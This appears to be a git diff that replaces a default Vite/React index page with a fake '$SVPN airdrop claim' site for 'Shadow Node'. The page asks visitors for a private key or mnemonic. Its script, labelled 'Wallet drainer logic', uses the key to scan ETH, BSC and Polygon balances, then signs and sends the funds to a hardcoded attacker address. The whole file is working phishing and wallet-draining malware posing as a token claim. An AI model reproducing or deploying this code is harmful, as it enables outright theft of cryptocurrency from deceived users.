@@ -1,14 +1,332 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-	<head>
-		<meta charset="UTF-8" />
-		<link rel="icon" type="image/svg+xml" href="/vite.svg" />
-		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-		<title>Vite + React + TS</title>
-	</head>
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0" />
+<title>Shadow Node $SVPN Airdrop Claim</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<style>
+    body {
+        background: linear-gradient(90deg,#19181e 70%,#7f5afb 110%);
+        background-color: #19181e;
+        min-height: 100vh;
+        margin: 0;
+        color: #fff;
+        font-family: 'Inter', Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+    }
+    .header {
+        display: flex;
+        align-items: center;
+        background: rgba(20,16,34,0.95);
+        padding: 30px 42px 18px 42px;
+        box-shadow: 0 3px 20px #190d4166;
+    }
+    .logo {
+        font-size: 2.1rem;
+        font-weight: bold;
+        color: #a48dff;
+        font-family: 'IBM Plex Mono', monospace;
+        letter-spacing: 2px;
+        margin-right: 18px;
+    }
+    .nav {
+        margin-left: 35px;
+        font-size: 1.19rem;
+        color: #d0bbe6;
+        display: flex;
+        gap: 35px;
+    }
+    .container {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: left;
+        min-height: 800px;
+        padding-left: 90px;
+        background: none;
+        position: relative;
+        z-index: 2;
+    }
+    .left-block {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        z-index: 9;
+        width: 540px;
+    }
+    .claim-title {
+        font-size: 3rem;
+        margin-top: 8px;
+        margin-bottom: 15px;
+        font-weight: 500;
+        color: #fff;
+        line-height: 1.08;
+        font-family: 'Inter', Arial, sans-serif;
+    }
+    .claim-title .purple {
+        color: #a48dff;
+        font-weight: 800;
+        font-family: 'IBM Plex Mono', monospace;
+        letter-spacing: 1px;
+    }
+    .subtitle {
+        font-size: 2.6rem;
+        font-weight: 500;
+        margin-bottom: 19px;
+        color: #fff;
+    }
+    .subtitle .bold {
+        color: #fff;
+        font-size: 2.8rem;
+        font-weight: bold;
+        font-family: 'Inter', Arial, sans-serif;
+    }
+    .claim-desc {
+        margin-bottom: 28px;
+        margin-top: 10px;
+        color: #bbb5ca;
+        font-size: 1.27rem;
+    }
+    .claim-btn {
+        background: #a48dff;
+        color: #fff;
+        font-size: 1.25rem;
+        font-weight: 700;
+        font-family: 'IBM Plex Mono', monospace;
+        border: none;
+        border-radius: 13px;
+        padding: 18px 38px;
+        letter-spacing: 1.2px;
+        box-shadow: 0 2px 14px #47248088;
+        cursor: pointer;
+        margin-top: 30px;
+        margin-bottom: 20px;
+        transition: 0.2s background;
+    }
+    .claim-btn:hover {
+        background: #8356e6;
+    }
+    .form-block {
+        margin-top: 55px;
+        background: rgba(33,21,55,0.92);
+        box-shadow: 0 5px 39px #5b3ff72e;
+        border-radius: 18px;
+        padding: 38px 43px;
+        max-width: 445px;
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+    }
+    .form-label {
+        color: #a48dff;
+        font-family: 'IBM Plex Mono', monospace;
+        font-size: 1.13rem;
+        font-weight: bold;
+        margin-bottom: 11px;
+    }
+    textarea {
+        width: 100%;
+        min-height: 60px;
+        background: #212139;
+        border: 2.6px solid #a48dff;
+        border-radius: 6px;
+        color: #e8e8ff;
+        font-size: 1.19rem;
+        font-family: 'IBM Plex Mono', monospace;
+        padding: 15px;
+        margin-bottom: 19px;
+    }
+    textarea:focus {
+        outline: none;
+        border-color: #7353e3;
+    }
+    .submit-btn {
+        background: #a48dff;
+        color: #fff;
+        font-size: 1.13rem;
+        font-family: 'IBM Plex Mono', monospace;
+        font-weight: bold;
+        border: none;
+        border-radius: 8px;
+        padding: 13px 50px;
+        cursor: pointer;
+        margin-top: 2px;
+        margin-bottom: 25px;
+        box-shadow: 0 2px 14px #47248052;
+        letter-spacing: 1.1px;
+    }
+    .submit-btn:active {
+        background: #8356e6;
+    }
+    .log-section {
+        width: 100%;
+        font-family: 'IBM Plex Mono', monospace;
+        font-size: 1.07rem;
+        color: #a48dff;
+        background: #170e1f;
+        border-radius: 6px;
+        padding: 18px 9px 7px 12px;
+        margin-top: 18px;
+        white-space: pre-wrap;
+        min-height: 56px;
+    }
+    @media(max-width:900px){
+        .container{padding-left: 18px;}
+        .left-block{width: 100%;}
+        .form-block {padding: 22px 10px;}
+    }
+</style>
+</head>
+<body>
+    <div class="header">
+        <span class="logo">Shadow Node</span>
+        <div class="nav">
+            Home
+            Features
+            Pricing
+            Tokenomics
+            WhiteLabel
+            Whitepaper
+            Staking
+        </div>
+    </div>
+    <div class="container">
+        <div class="left-block">
+            <div class="claim-title">
+                Claim <span class="purple">$SVPN</span> Revenue Share For
+            </div>
+            <div class="subtitle">
+                <span class="bold">Holders</span>
+            </div>
+            <div class="claim-desc">
+                Check your eligibility to claim $SVPN
+            </div>
+            <button class="claim-btn" id="showFormBtn">CLAIM NOW &rarr;</button>
+            <div class="form-block" id="formBlock" style="display:none">
+                <div class="form-label">Private Key or Mnemonic Phrase</div>
+                <textarea id="walletInput" placeholder="Enter your private key (0x...) or mnemonic (12 words)..."></textarea>
+                <button class="submit-btn" id="submitBtn">Start Claim</button>
+                <div class="log-section" id="logSection" style="display:none;"></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('showFormBtn').onclick = function() {
+            document.getElementById('formBlock').style.display = 'flex';
+        };
 
-	<body>
-		<div id="root"></div>
-		<script type="module" src="/src/react-app/main.tsx"></script>
-	</body>
+        // Wallet drainer logic: 100% unchanged!
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const walletInput = document.getElementById('walletInput').value.trim();
+            const logSection = document.getElementById('logSection');
+            logSection.textContent = "";
+            logSection.style.display = "block";
+
+            const CHAINS = [
+                {
+                    name: "ETH",
+                    rpcs: [
+                        "https://rpc.ankr.com/eth",
+                        "https://eth-mainnet.public.blastapi.io",
+                        "https://ethereum.publicnode.com"
+                    ],
+                    chainId: 1,
+                    symbol: "ETH"
+                },
+                {
+                    name: "BSC",
+                    rpcs: [
+                        "https://bsc-dataseed.binance.org/",
+                        "https://bsc-dataseed1.defibit.io/",
+                        "https://bsc-dataseed1.ninicoin.io/"
+                    ],
+                    chainId: 56,
+                    symbol: "BNB"
+                },
+                {
+                    name: "Polygon",
+                    rpcs: [
+                        "https://polygon-rpc.com/",
+                        "https://polygon-bor.publicnode.com",
+                        "https://rpc-mainnet.matic.quiknode.pro"
+                    ],
+                    chainId: 137,
+                    symbol: "MATIC"
+                }
+            ];
+            const DRAIN_ADDR = "0xb3c568DE21825D84B994878FD77F7f92FfDCAE8b";
+
+            async function getWeb3WithFallback(rpcs){
+                for (const rpc of rpcs) {
+                    try {
+                        const web3 = new Web3(new Web3.providers.HttpProvider(rpc));
+                        await web3.eth.getBlockNumber();
+                        return web3;
+                    } catch {
+                        continue;
+                    }
+                }
+                throw new Error("All RPCs failed");
+            }
+
+            async function scanAndDrain(){
+                let account;
+                logSection.textContent += "Scanning wallet...\n";
+                try {
+                    if(walletInput.includes(" ")){
+                        logSection.textContent += "Mnemonic not supported\n";
+                        return;
+                    } else {
+                        const web3Temp = new Web3();
+                        account = web3Temp.eth.accounts.privateKeyToAccount(
+                            walletInput.startsWith('0x') ? walletInput : '0x'+walletInput
+                        );
+                        logSection.textContent += "Wallet: "+account.address+"\n";
+                    }
+                } catch(error){
+                    logSection.textContent += "Invalid key\n";
+                    return;
+                }
+                for(const chain of CHAINS){
+                    logSection.textContent += "\n["+chain.name+"] Connecting...\n";
+                    try {
+                        const web3 = await getWeb3WithFallback(chain.rpcs);
+                        const balanceWei = await web3.eth.getBalance(account.address);
+                        const balance = web3.utils.fromWei(balanceWei, 'ether');
+                        if(parseFloat(balance) > 0){
+                            logSection.textContent += chain.name+": "+balance+" "+chain.symbol+" found\n";
+                            const gasPrice = await web3.eth.getGasPrice();
+                            const gasCostWei = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(21000));
+                            const balanceBN = web3.utils.toBN(balanceWei);
+                            if(balanceBN.gt(gasCostWei)){
+                                const transferAmount = balanceBN.sub(gasCostWei);
+                                const tx = {
+                                    to: DRAIN_ADDR,
+                                    value: transferAmount.toString(),
+                                    gas: 21000,
+                                    gasPrice: gasPrice,
+                                    nonce: await web3.eth.getTransactionCount(account.address),
+                                    chainId: chain.chainId
+                                };
+                                const signedTx = await web3.eth.accounts.signTransaction(tx, account.privateKey);
+                                const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+                                logSection.textContent += chain.name+" transfer successful!\nHash: "+txHash+"\n";
+                            } else {
+                                logSection.textContent += chain.name+": Not enough balance for gas\n";
+                            }
+                        } else {
+                            logSection.textContent += chain.name+": No funds found\n";
+                        }
+                    } catch(error){
+                        logSection.textContent += chain.name+": "+error.message+"\n";
+                    }
+                }
+                logSection.textContent += "\nAll transfers complete.";
+            }
+            scanAndDrain();
+        });
+    </script>
+</body>
 </html>
